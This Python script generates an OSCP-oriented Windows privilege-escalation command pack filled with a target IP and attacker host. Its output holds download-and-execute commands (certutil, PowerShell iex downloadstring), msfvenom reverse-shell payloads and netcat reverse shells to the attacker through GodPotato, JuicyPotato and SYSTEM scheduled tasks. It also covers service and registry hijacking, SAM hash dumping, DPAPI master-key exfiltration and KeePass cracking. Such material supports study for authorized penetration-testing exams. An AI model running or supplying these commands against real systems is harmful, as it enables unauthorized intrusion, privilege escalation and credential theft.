#!/usr/bin/env python3
r"""
Windows PrivEsc command-pack generator (OSCP-oriented).

- Full 21-section workflow
- Rerunnable: overwrite output as you learn new facts
- Generator only: never executes anything
- Hardened against unicodeescape / raw-string issues
"""

from pathlib import Path

# ---- constants ----
LPORT = "443"
WIN_PUBLIC = "C:\\Users\\Public\\Downloads"
WIN_TEMP = "C:\\Windows\\Temp"
DEFAULT_PAYLOAD = "C:\\PrivEsc\\<PAYLOAD>.exe"


# ---- helpers ----
def req(msg):
    while True:
        v = input(f"{msg}: ").strip()
        if v:
            return v


def opt(msg):
    return input(f"{msg} (blank if unknown): ").strip()


def outfile(ip):
    return "win_privesc_{}.txt".format(ip.replace(".", "_"))


def pick(val, placeholder):
    return val if val else placeholder


def full_user(domain, user):
    if not user:
        return "<DOMAIN>\\<USER>"
    if "\\" in user:
        return user
    if domain:
        return "{}\\{}".format(domain, user)
    return "<DOMAIN>\\{}".format(user)


# ---- builder ----
def build(
    target_ip,
    lhost,
    domain,
    user,
    service,
    payload,
    clsid,
    missing_dll,
):
    svc = pick(service, "<SERVICE>")
    usr = full_user(domain, user)
    payload = payload if payload else DEFAULT_PAYLOAD
    clsid = pick(clsid, "<CLSID>")
    dll = pick(missing_dll, "<MISSINGDLL>")

    L = []

    # Header
    L += [
        "# Windows PrivEsc command pack for: {}".format(target_ip),
        "# Rerun this generator as you discover new facts (overwrites each run)",
        "",
        "# Known values:",
        "# TARGET_IP : {}".format(target_ip),
        "# LHOST     : {}".format(lhost),
        "# LPORT     : {}".format(LPORT),
        "# DOMAIN    : {}".format(domain if domain else "<DOMAIN>"),
        "# USER      : {}".format(usr),
        "# SERVICE   : {}".format(svc),
        "# PAYLOAD   : {}".format(payload),
        "# CLSID     : {}".format(clsid),
        "# DLL       : {}".format(dll),
        "",
    ]

    # 1. Context
    L += [
        "# 1. Context",
        "whoami",
        "whoami /priv",
        "whoami /groups",
        "whoami /all",
        "echo %COMSPEC%",
        "systeminfo | findstr /B /C:\"OS Name\" /C:\"OS Version\" /C:\"System Type\"",
        "systeminfo | findstr /i \"Domain\"",
        "wmic os get osarchitecture",
        "",
    ]

    # 2. CMD boundary
    L += [
        "# 2. CMD boundary",
        "cmd /c \"<command>\"",
        "cmd /c sc qc {}".format(svc),
        "cmd /c schtasks /query /fo LIST /v",
        "cmd /c accesschk.exe /accepteula -uwcqv %USERNAME% *",
        "",
    ]

    # 3. Filesystem / users
    L += [
        "# 3. Filesystem & users",
        "cd \\",
        "dir",
        "dir /a",
        "cd \\users",
        "dir",
        "net user",
        "net user <USER>",
        "net localgroup Administrators",
        "",
        "dir \"C:\\Program Files\"",
        "dir \"C:\\Program Files (x86)\"",
        "",
    ]

    # 4. Environment
    L += [
        "# 4. Environment variables",
        "set",
        "echo %PATH%",
        "echo %TEMP%",
        "echo %TMP%",
        "echo %USERNAME%",
        "echo %USERPROFILE%",
        "powershell -c Get-ChildItem Env:",
        "powershell -c \"Get-ChildItem Env: | Where-Object { $_.Name -match 'PASS|KEY|TOKEN|SECRET|API' }\"",
        "",
    ]

    # 5. Cred hunting
    L += [
        "# 5. Cred hunting & configs",
        "type C:\\Users\\<USER>\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt",
        "dir C:\\Users",
        "type C:\\Users\\<OTHERUSER>\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt",
        "",
        "dir C:\\inetpub",
        "dir C:\\xampp",
        "powershell -c \"dir -recurse *.php | select-string -pattern 'database'\"",
        (
            "for /d %u in (C:\\Users\\*) do @findstr /s /i /m \"password\" \"%u\\*.txt\" ^"
            "| findstr /v /i /c:\"\\AppData\" /c:\"\\Local\" /c:\"\\Temp\" /c:\"\\Cookies\" /c:\"\\History\" /c:\"\\Cache\""
        ),
        "",
    ]

    # 6. Network & processes
    L += [
        "# 6. Network & processes",
        "netstat -ano",
        "netstat -ano | findstr TCP | findstr \":0\"",
        "tasklist",
        "tasklist /SVC",
        "tasklist /v | findstr <PID>",
        "tasklist /svc /fi \"imagename eq <EXE>\"",
        "curl 127.0.0.1:<PORT>",
        "",
    ]

    # 7. Scheduled tasks
    L += [
        "# 7. Scheduled tasks",
        "schtasks /query /fo LIST /v",
        "schtasks /query /fo LIST /v | findstr /i \"<KEYWORD>\"",
        "",
    ]

    # 8. File transfer
    L += [
        "# 8. File transfer",
        "cd /d {}".format(WIN_PUBLIC),
        "certutil -urlcache -split -f http://{}/<FILE> <FILE>".format(lhost),
        "powershell -c \"(new-object System.Net.WebClient).DownloadFile('http://{}/<FILE>', '{}\\\\<FILE>')\"".format(lhost, WIN_PUBLIC),
        "powershell -Command \"iex (new-object net.webclient).downloadstring('http://{}/<SCRIPT>.ps1')\"".format(lhost),
        "powershell -c \"Expand-Archive -Path '{}\\\\<ARCHIVE>.zip' -DestinationPath .\"".format(WIN_PUBLIC),
        "",
    ]

    # 9. SMB helpers
    L += [
        "# 9. SMB helpers",
        "# [ATTACKER] Start SMB server from your Kali/Debian box",
        "cd ~/share",
        "sudo smbserver.py share . -smb2support",
        "",
        "# [TARGET] Map share + copy files",
        "net use \\\\{}\\share".format(lhost),
        "copy \\\\{}\\share\\<FILE> <FILE>".format(lhost),
        "copy <FILE> \\\\{}\\share".format(lhost),
        "net use /d \\\\{}\\share".format(lhost),
        "",
    ]

    # 10. WinRM helpers
    L += [
        "# 10. WinRM (evil-winrm)",
        "upload <FILE>",
        "dir",
        ".\\<FILE>",
        "download <FILE>",
        "",
    ]

    # 11. WinPEAS
    L += [
        "# 11. WinPEAS",
        "cd /d {}".format(WIN_PUBLIC),
        "# Optional: enable ANSI escape processing for cleaner coloured output",
        "REG ADD HKCU\\Console /v VirtualTerminalLevel /t REG_DWORD /d 1",
        "winPEASany.exe",
        "winPEASany.exe > winpeas.txt",
        "more winpeas.txt",
        "",
    ]

    # 12. WES
    L += [
        "# 12. WES [ATTACKER]",
        "wes systeminfo.txt --impact \"Elevation of Privilege\" --severity critical,important --exploits-only",
        "wes systeminfo.txt --impact \"Elevation of Privilege\" --severity critical,important --exploits-only --output wes_eop.txt",
        "less -R wes_eop.txt",
        "",
    ]

    # 13. Service discovery
    L += [
        "# 13. Service discovery",
        "accesschk.exe /accepteula -uwcq %USERNAME% *",
        "accesschk.exe /accepteula -uwcqv %USERNAME% *",
        "accesschk.exe /accepteula -uwcqv %USERNAME% {}".format(svc),
        "sc qc {}".format(svc),
        "",
    ]

    # 14. Service binPath abuse
    L += [
        "# 14. Service abuse: binPath",
        "rlwrap -cAr nc -lnvp {}".format(LPORT),
        "sc config {} binpath= \"{}\"".format(svc, payload),
        "net start {}".format(svc),
        "sc.exe stop {}".format(svc),
        "sc.exe start {}".format(svc),
        "",
    ]

    # 15. Unquoted service paths
    L += [
        "# 15. Unquoted service paths",
        "wmic service get name,displayname,pathname,startmode | findstr /i \"Auto\" | findstr /i /v \"C:\\Windows\\\\\" | findstr /i /v \"\"\"",
        "sc qc {}".format(svc),
        "msfvenom -p windows/shell_reverse_tcp LHOST={} LPORT={} -f exe -o <PLANTEDNAME>.exe".format(lhost, LPORT),
        "rlwrap -cAr nc -lnvp {}".format(LPORT),
        "sc.exe stop {}".format(svc),
        "sc.exe start {}".format(svc),
        "",
    ]

    # 16. Registry ImagePath
    L += [
        "# 16. Registry ImagePath abuse",
        "powershell -c \"get-acl HKLM:\\System\\CurrentControlSet\\services\\* | Format-List * | findstr /i 'user Users Path Everyone' > output.txt\"",
        "reg add HKLM\\SYSTEM\\CurrentControlSet\\services\\{} /v ImagePath /t REG_EXPAND_SZ /d {} /f".format(svc, payload),
        "rlwrap -cAr nc -lnvp {}".format(LPORT),
        "net start {}".format(svc),
        "",
    ]

    # 17. Token impersonation
    L += [
        "# 17. Token impersonation",
        "whoami /priv",
        "PrintSpoofer64.exe -i -c powershell.exe",
        "rlwrap -cAr nc -lnvp {}".format(LPORT),
        "cmd.exe /c GodPotato.exe -cmd \"nc.exe {} {} -e cmd\"".format(lhost, LPORT),
        "schtasks /create /sc once /st 00:00 /tn revshell /tr \"{}\\nc.exe {} {} -e cmd.exe\" /ru SYSTEM /f".format(WIN_TEMP, lhost, LPORT),
        "schtasks /run /tn revshell",
        "rlwrap -cAr nc -lnvp {}".format(LPORT),
        "JuicyPotato.exe -l 1337 -c \"{{{}}}\" -p c:\\windows\\system32\\cmd.exe -a \"/c nc.exe {} {} -e cmd.exe\" -t *".format(clsid, lhost, LPORT),
        "",
    ]

    # 18. Offline hashes
    L += [
        "# 18. Offline hashes [ATTACKER]",
        "sudo su",
        "secretsdump.py -sam SAM -security SECURITY -system SYSTEM LOCAL",
        "",
    ]

    # 19. DPAPI
    L += [
        "# 19. DPAPI master key exfil",
        "# [TARGET] Locate and base64-encode masterkey file",
        "cd C:\\Users\\<USER>\\AppData\\Roaming\\Microsoft\\Protect\\<SID>",
        "powershell -C \"Get-ChildItem . -Force\"",
        "certutil -encode <MASTERKEY_GUID_FILE> masterkey.b64",
        "type masterkey.b64",
        "# [ATTACKER] Decode the base64 blob you copied out",
        "base64 -d masterkey.b64 > masterkey",
        "",
    ]

    # 20. KeePass
    L += [
        "# 20. KeePass",
        "keepass2 <DB>.kdbx",
        "keepass2john <DB>.kdbx > keepass.hash",
        "john --wordlist=/usr/share/wordlists/rockyou.txt keepass.hash",
        "",
    ]

    # 21. Runas + egress
    L += [
        "# 21. Runas + egress",
        "runas /user:{} cmd".format(usr),
        "powershell -c Get-NetFirewallRule -Direction Outbound -Enabled True -Action Block",
        "powershell -c Get-NetFirewallRule -Direction Outbound -Enabled True -Action Allow",
        "",
    ]

    return "\n".join(L) + "\n"


def main():
    print("WIN PRIVESC SYNTAX FILLER (full, rerunnable)")

    ip = req("Target IP")
    lhost = req("LHOST")

    domain = opt("DOMAIN")
    user = opt("USER")
    service = opt("SERVICE")
    payload = opt("PAYLOAD_PATH")
    clsid = opt("CLSID")
    dll = opt("MISSING DLL (no .dll)")

    text = build(ip, lhost, domain, user, service, payload, clsid, dll)
    Path(outfile(ip)).write_text(text)
    print("Generated", outfile(ip))


if __name__ == "__main__":
    main()
